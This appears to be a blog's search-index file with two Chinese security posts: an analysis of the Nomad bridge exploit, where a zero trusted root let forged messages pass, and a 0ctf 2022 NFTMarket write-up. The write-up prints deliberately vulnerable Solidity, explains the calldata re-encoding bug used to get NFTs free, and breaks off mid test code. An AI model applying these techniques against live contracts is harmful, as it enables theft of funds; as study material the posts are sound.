<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Nomad跨链桥被黑事件分析</title>
      <link href="/Nomad/"/>
      <url>/Nomad/</url>
      
        <content type="html"><![CDATA[<h1 id="Nomad跨链桥被黑事件分析"><a href="#Nomad跨链桥被黑事件分析" class="headerlink" title="Nomad跨链桥被黑事件分析"></a>Nomad跨链桥被黑事件分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>笔者最近对跨链桥特别感兴趣，于是开始研究跨链桥上的安全事件，其中最典型的非Nomad莫属。Nomad桥于2022年8月初遭遇到了Web3有史以来最混乱的一次攻击，有非常多的散户参与到了这次攻击。总共损失了1.9亿美元，当然，有一种说法是Nomad方面发现事态失控后，也参与了“对自己的攻击”。</p><p>简单的来说，这是一个类似于交易重放的攻击。这也是为什么有很多技术上造诣不深的散客也能参与其中的原因。</p><h2 id="Nomad"><a href="#Nomad" class="headerlink" title="Nomad"></a>Nomad</h2><p>在对漏洞进行分析之前，我们先来解析一下Nomad协议的原理。</p><p><img src="message.png" alt=""></p><p>简单的来讲就是Chain1在确认收到了eth1后会生成一个Message，Chain2这边会去检查这个Message的真实性，随后会进行换币的一系列操作。</p><p>可问题就出在这里，chain2在检查Message的时候出现了一个非常非常严重的漏洞，导致这个Message可以被伪造从而通过chain2的检查。</p><p><img src="Nomad_system.png" alt=""></p><p>从上图可以发现：Nomad主要包括Home、Replica合约两部分。其中，Home合约主要负责跨链消息Message的格式化、维护Message默克尔消息树和默克尔树root值队列；Replica合约是所有想要接收跨链消息的区块链都必须部署的，主要负责维护与Home合约对应的默克尔消息树和root值队列、Message的验证和执行。<strong>Nomad与其他一对一的跨链通信模型不同，其允许一对N的广播通信。</strong>其中，Home合约负责消息生成，而任何希望复制该消息状态或从Home合约接收消息的目标链都必须部署一个与该Home合约对应的Replica合约。</p><p>而问题，就出在了Replica合约上。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460/contracts" target="_blank" rel="noopener">0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460 | Tenderly</a></p><p>这里我们直接定位到出问题的Replica合约上。</p><p><img src="image-20230309201952091.png" alt=""></p><p>process函数会检查我们之前提到的message，而<code>messages</code>是一个mapping结构，mapping在空字段上的返回值是0。那也就是说如果<code>acceptableRoot()</code>函数能够接收一个0的输入而返回true即可。</p><p>在这个require后，我们的换币操作将畅通无阻。</p><p>让我们进入到<code>acceptableRoot()</code>函数中：</p><p><img src="Nomad/image-20230309203804819.png" alt="image-20230309203804819"></p><p>这里只需要time &gt; 0即可，而问题的关键就出现在confirmAt这个mapping在初始化的时候，项目方传入的<code>_committedRoot</code>是0。</p><p><img src="image-20230309203942414.png" alt="image-20230309203942414"></p><p>那这不就巧了嘛，前前后后的各个环节都能对应上。到这里我们已经成功的解决的了message的验证这个事儿。</p><p>而为了完成交易，攻击者只需要监控Nomad上的交易，将交易的其他参数直接copy过来，把message和收款地址一换，就大功告成了。</p><p><img src="image-20230309204716542.png" alt="image-20230309204716542"></p><p>这也是为什么大部分的攻击交易的金额都是一样的原因。</p><h2 id="散户为什么能得到消息参与攻击？"><a href="#散户为什么能得到消息参与攻击？" class="headerlink" title="散户为什么能得到消息参与攻击？"></a>散户为什么能得到消息参与攻击？</h2><p>在这次事件中，最让人惊讶的是非常多的散户参与到了这次攻击事件中。由于这次攻击需要的技术含量不高，按理来说他们确实有条件参与攻击。</p><p>但问题是？他们哪来的消息？</p><p>答案是现在各大链都有一些MEV BOT，MEV会尝试跑链上的交易，一旦MEV发现这个交易执行的时候能够盈利，MEV就会自动的执行这个操作。</p><p>这样的MEV也叫做搜索机器人。</p><h2 id="审计报告提到过？"><a href="#审计报告提到过？" class="headerlink" title="审计报告提到过？"></a>审计报告提到过？</h2><p>非常非常讽刺的是，在<code>Quantstamp</code>给Nomad的审计报告中，提到过这个漏洞，只不过当时<code>Quantstamp</code>给了这个漏洞low的评级，可能并没有引起项目方的重视。</p><p>我猜测<code>Quantstamp</code>可能认为Nomad项目方不会再init的时候将<code>_committedRoot</code>设置为0。可是…万万没想到发生了这样的事。</p><p><img src="image-20230309205441599.png" alt="image-20230309205441599"></p><p>审计报告链接：</p><p><a href="https://github.com/nomad-xyz/docs/blob/1ff0c55dba2a842c811468c57793ff9a6542ef0f/docs/public/Nomad-Audit.pdf" target="_blank" rel="noopener">docs/Nomad-Audit.pdf at 1ff0c55dba2a842c811468c57793ff9a6542ef0f ·Nomad-XYZ/docs (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> bridge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bridge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf-2022-NFTMarket</title>
      <link href="/0ctf-2022-NFTMarket/"/>
      <url>/0ctf-2022-NFTMarket/</url>
      
        <content type="html"><![CDATA[<h1 id="0ctf-2022-NFTMarket"><a href="#0ctf-2022-NFTMarket" class="headerlink" title="0ctf-2022-NFTMarket"></a>0ctf-2022-NFTMarket</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>此题搬运自iczc大佬的blog，这个题的关键点在于solidity 8.16版本之前的bug。我觉得很有意思，于是在这里记录一下。</p><p>而其实这个漏洞在solidity的官方blog中提到过，这给我们一个启示就是，要随时关注官方的blog。</p><h2 id="题目合约"><a href="#题目合约" class="headerlink" title="题目合约"></a>题目合约</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.15;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC721&#x2F;ERC721.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;access&#x2F;Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract TctfNFT is ERC721, Ownable &#123;</span><br><span class="line">    constructor() ERC721(&quot;TctfNFT&quot;, &quot;TNFT&quot;) &#123;</span><br><span class="line">        _setApprovalForAll(address(this), msg.sender, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 tokenId) external onlyOwner &#123;</span><br><span class="line">        _mint(to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TctfToken is ERC20 &#123;</span><br><span class="line">    bool airdropped;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;TctfToken&quot;, &quot;TTK&quot;) &#123;</span><br><span class="line">        _mint(address(this), 100000000000);</span><br><span class="line">        _mint(msg.sender, 1337);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function airdrop() external &#123;</span><br><span class="line">        require(!airdropped, &quot;Already airdropped&quot;);</span><br><span class="line">        airdropped &#x3D; true;</span><br><span class="line">        _mint(msg.sender, 5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Order &#123;</span><br><span class="line">    address nftAddress;</span><br><span class="line">    uint256 tokenId;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line">struct Coupon &#123;</span><br><span class="line">    uint256 orderId;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[2] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedCoupon &#123;</span><br><span class="line">    Coupon coupon;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TctfMarket &#123;</span><br><span class="line">    event SendFlag();</span><br><span class="line">    event NFTListed(</span><br><span class="line">        address indexed seller,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId,</span><br><span class="line">        uint256 price</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event NFTCanceled(</span><br><span class="line">        address indexed seller,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event NFTBought(</span><br><span class="line">        address indexed buyer,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId,</span><br><span class="line">        uint256 price</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    bool tested;</span><br><span class="line">    TctfNFT public tctfNFT;</span><br><span class="line">    TctfToken public tctfToken;</span><br><span class="line">    CouponVerifierBeta public verifier;</span><br><span class="line">    Order[] orders;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        tctfToken &#x3D; new TctfToken();</span><br><span class="line">        tctfToken.approve(address(this), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        tctfNFT &#x3D; new TctfNFT();</span><br><span class="line">        tctfNFT.mint(address(tctfNFT), 1);</span><br><span class="line">        tctfNFT.mint(address(this), 2);</span><br><span class="line">        tctfNFT.mint(address(this), 3);</span><br><span class="line"></span><br><span class="line">        verifier &#x3D; new CouponVerifierBeta();</span><br><span class="line"></span><br><span class="line">        orders.push(Order(address(tctfNFT), 1, 1));</span><br><span class="line">        orders.push(Order(address(tctfNFT), 2, 1337));</span><br><span class="line">        orders.push(Order(address(tctfNFT), 3, 13333333337));</span><br><span class="line">        &#x2F;&#x2F;                                     100000000000</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOrder(uint256 orderId) public view returns (Order memory order) &#123;</span><br><span class="line">        require(orderId &lt; orders.length, &quot;Invalid orderId&quot;);</span><br><span class="line">        order &#x3D; orders[orderId];        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) &#123;</span><br><span class="line">        require(price &gt; 0, &quot;Invalid price&quot;);</span><br><span class="line">        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), &quot;Not owner&quot;);</span><br><span class="line">        orders.push(Order(nftAddress, tokenId, price));</span><br><span class="line">        emit NFTListed(msg.sender, nftAddress, tokenId, price);</span><br><span class="line">        return orders.length - 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cancelOrder(uint256 orderId) external &#123;</span><br><span class="line">        Order memory order &#x3D; getOrder(orderId);</span><br><span class="line">        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), &quot;Not owner&quot;);</span><br><span class="line">        _deleteOrder(orderId);</span><br><span class="line">        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseOrder(uint256 orderId) external &#123;</span><br><span class="line">        Order memory order &#x3D; getOrder(orderId);</span><br><span class="line">        _deleteOrder(orderId);</span><br><span class="line">        IERC721 nft &#x3D; IERC721(order.nftAddress);</span><br><span class="line">        address owner &#x3D; nft.ownerOf(order.tokenId);</span><br><span class="line">        tctfToken.transferFrom(msg.sender, owner, order.price);</span><br><span class="line">        nft.safeTransferFrom(owner, msg.sender, order.tokenId);</span><br><span class="line">        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseWithCoupon(SignedCoupon calldata scoupon) external &#123;</span><br><span class="line">        Coupon memory coupon &#x3D; scoupon.coupon;</span><br><span class="line">        require(coupon.user &#x3D;&#x3D; msg.sender, &quot;Invalid user&quot;);</span><br><span class="line">        require(coupon.newprice &gt; 0, &quot;Invalid price&quot;);</span><br><span class="line">        verifier.verifyCoupon(scoupon);</span><br><span class="line">        Order memory order &#x3D; getOrder(coupon.orderId);</span><br><span class="line">        _deleteOrder(coupon.orderId);</span><br><span class="line">        IERC721 nft &#x3D; IERC721(order.nftAddress);</span><br><span class="line">        address owner &#x3D; nft.ownerOf(order.tokenId);</span><br><span class="line">        tctfToken.transferFrom(coupon.user, owner, coupon.newprice);</span><br><span class="line">        nft.safeTransferFrom(owner, coupon.user, order.tokenId);</span><br><span class="line">        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external &#123;</span><br><span class="line">        require(!tested, &quot;Tested&quot;);</span><br><span class="line">        tested &#x3D; true;</span><br><span class="line">        IERC721 nft &#x3D; IERC721(nftAddress);</span><br><span class="line">        uint256 orderId &#x3D; TctfMarket(this).createOrder(nftAddress, tokenId, price);</span><br><span class="line">        nft.approve(address(this), tokenId);</span><br><span class="line">        TctfMarket(this).purchaseOrder(orderId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function win() external &#123;</span><br><span class="line">        require(tctfNFT.ownerOf(1) &#x3D;&#x3D; msg.sender &amp;&amp; tctfNFT.ownerOf(2) &#x3D;&#x3D; msg.sender &amp;&amp; tctfNFT.ownerOf(3) &#x3D;&#x3D; msg.sender);</span><br><span class="line">        emit SendFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) &#123;</span><br><span class="line">        IERC721 nft &#x3D; IERC721(nftAddress);</span><br><span class="line">        address owner &#x3D; nft.ownerOf(tokenId);</span><br><span class="line">        return (spender &#x3D;&#x3D; owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) &#x3D;&#x3D; spender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _deleteOrder(uint256 orderId) internal &#123;</span><br><span class="line">        orders[orderId] &#x3D; orders[orders.length - 1];</span><br><span class="line">        orders.pop();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) &#123;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CouponVerifierBeta &#123;</span><br><span class="line">    TctfMarket market;</span><br><span class="line">    bool tested;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        market &#x3D; TctfMarket(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyCoupon(SignedCoupon calldata scoupon) public &#123;</span><br><span class="line">        require(!tested, &quot;Tested&quot;);</span><br><span class="line">        tested &#x3D; true;</span><br><span class="line">        Coupon memory coupon &#x3D; scoupon.coupon;</span><br><span class="line">        Signature memory sig &#x3D; scoupon.signature;</span><br><span class="line">        Order memory order &#x3D; market.getOrder(coupon.orderId);</span><br><span class="line">        bytes memory serialized &#x3D; abi.encode(</span><br><span class="line">            &quot;I, the issuer&quot;, coupon.issuer,</span><br><span class="line">            &quot;offer a special discount for&quot;, coupon.user,</span><br><span class="line">            &quot;to buy&quot;, order, &quot;at&quot;, coupon.newprice,</span><br><span class="line">            &quot;because&quot;, coupon.reason</span><br><span class="line">        );</span><br><span class="line">        IERC721 nft &#x3D; IERC721(order.nftAddress);</span><br><span class="line">        address owner &#x3D; nft.ownerOf(order.tokenId);</span><br><span class="line">        require(coupon.issuer &#x3D;&#x3D; owner, &quot;Invalid issuer&quot;);</span><br><span class="line">        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) &#x3D;&#x3D; coupon.issuer, &quot;Invalid signature&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目逻辑还是很简单的，实现了一个简易版本的 nft market。</p><p>完成题目需要获得 1， 2， 3 号nft，这些 nft 是属于题目合约的（1属于 nft 合约本身，不过不影响），并且在最开始就被放入了市场中，价格分别为1，1337，133333333337.</p><p>初始状态选手只能获得5个token空投，market拥有1337个token。</p><p>常理来说玩家只能购买1号nft，剩下的两个太贵了买不起。</p><p>purchaseTest 属于一个后门，其逻辑如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">purchaseTest</span>(<span class="params">address nftAddress, uint256 tokenId, uint256 price</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!tested, <span class="string">"Tested"</span>);</span><br><span class="line">        tested = <span class="literal">true</span>;</span><br><span class="line">        IERC721 nft = IERC721(nftAddress);</span><br><span class="line">        uint256 orderId = TctfMarket(<span class="keyword">this</span>).createOrder(nftAddress, tokenId, price);</span><br><span class="line">        nft.approve(address(<span class="keyword">this</span>), tokenId);</span><br><span class="line">        TctfMarket(<span class="keyword">this</span>).purchaseOrder(orderId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数可以让market本身进行一个新的order的构造，然后让market自己再把这个order买下来。</p><p>但是问题是这个函数没有制定nft的地址，所以完全可以自己构造一个fakenft，让market买下来，这样可以最多获得1337个token，这样2号就解决了。</p><p>那么1和2搞定了，如何搞定3呢？</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>想拿出来3，有三种方式：</p><ol><li>搞出来一堆erc20，但是题目合约最多就1337个，token合约虽然给自己mint了一堆，但是没有其他操作，所以不可行。</li><li>改价格：1. 在交易过程中改 2. 通过coupon</li><li>直接给转出来，没看到有能利用的点</li></ol><p>其中1和3都是不可行的，只有2是可能的。</p><h3 id="如何改价格"><a href="#如何改价格" class="headerlink" title="如何改价格"></a>如何改价格</h3><p>对于在交易过程中改价格，想法是通过可控的外部调用进行重入，改变order数组的结构。</p><p>对于改价格的点，有如下几个：</p><ol><li>safetransferFrom：没用，每次调用都是在交易末尾，重入没有意义。</li><li>purchaseTest的approve：可以构造一个假的nft，重写approve逻辑进行重入，但是问题是，我们的目的是改变3的价格，对于3的order，只有其owner可以创建，那么唯一的机会就是在test里面，那么nft的地址就必须是题目的地址，那么久没法改approve进行重入。如果上来就给假的nft地址，那么这一切都毫无意义，不可行。</li><li>verifyCoupon的ownerOf：由于purchaseWithCoupon 函数调用 verify 前后没有对conpon的order进行一致性校验，那么按理说我们就可以通过在verifyCoupon函数中做一些操作改变order数组结构，也就是使得签名验证和后续的购买出现偏差，使得可以低价购入3号nft。（正确思路确实要用到这里，但是并不是上述的思路）</li></ol><p>对于3号思路，本来想的是没问题的，但是在后面才想起来ownerOf是一个view函数，底层用的是staticcall，不能做状态改变，所以这条路也行不通。</p><h2 id="正解"><a href="#正解" class="headerlink" title="正解"></a><strong>正解</strong></h2><p>这是一个8.15以及之前版本出现的问题，详细解释见这篇文章：<a href="https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/" target="_blank" rel="noopener">https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/</a></p><p>通俗来说，就是如果一个结构体中间有一个变长的结构，比如string或者bytes，那么他在第二次打包的时候会出现bug，导致结构体的第一个字段被改成0.</p><p>题目中的结构体为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">struct Order &#123;</span><br><span class="line">    address nftAddress;</span><br><span class="line">    uint256 tokenId;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line">struct Coupon &#123;</span><br><span class="line">    uint256 orderId;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[2] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedCoupon &#123;</span><br><span class="line">    Coupon coupon;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中SignedCoupon就是一个满足条件的可以触发bug的结构体，以为他中间的字段reason是个变长字段，第二次打包calldata，也就是传入verify的时候，他的第一个字段也就是orderId就成0了。</p><blockquote><p>而题目合约没有创tokenid为0的NFT，这就给了我们钻空子的机会，我们只需要mint一个tokenid为0的NFT，并把价格设为0就可以免费购入所有NFT。</p></blockquote><p>测试代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity  <span class="number">0.8</span><span class="number">.15</span>;</span><br><span class="line">struct Order &#123;</span><br><span class="line">    address nftAddress;</span><br><span class="line">    uint256 tokenId;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line">struct Coupon &#123;</span><br><span class="line">    uint256 orderId;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[<span class="number">2</span>] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedCoupon &#123;</span><br><span class="line">    Coupon coupon;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br><span class="line">contract Verifier&#123;</span><br><span class="line">    address public issuer;</span><br><span class="line">    address public recovered;</span><br><span class="line">    Coupon public c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">verifyCoupon</span>(<span class="params">SignedCoupon calldata scoupon</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Coupon memory coupon = scoupon.coupon;</span><br><span class="line">        Signature memory sig = scoupon.signature;</span><br><span class="line">        c=coupon; </span><br><span class="line">        Order memory order;</span><br><span class="line">        order.nftAddress = address(<span class="number">0</span>);</span><br><span class="line">        order.tokenId = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        order.price = <span class="number">0xcafebabe</span>;</span><br><span class="line">        bytes memory serialized = abi.encode(</span><br><span class="line">            <span class="string">"I, the issuer"</span>, coupon.issuer,</span><br><span class="line">            <span class="string">"offer a special discount for"</span>, coupon.user,</span><br><span class="line">            <span class="string">"to buy"</span>, order, <span class="string">"at"</span>, coupon.newprice,</span><br><span class="line">            <span class="string">"because"</span>, coupon.reason</span><br><span class="line">        );</span><br><span class="line">        recovered = ecrecover(keccak256(serialized), sig.v, sig.rs[<span class="number">0</span>], sig.rs[<span class="number">1</span>]);</span><br><span class="line">        issuer = coupon.issuer; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract caller&#123;</span><br><span class="line">    Verifier public verifier;</span><br><span class="line">    Coupon public 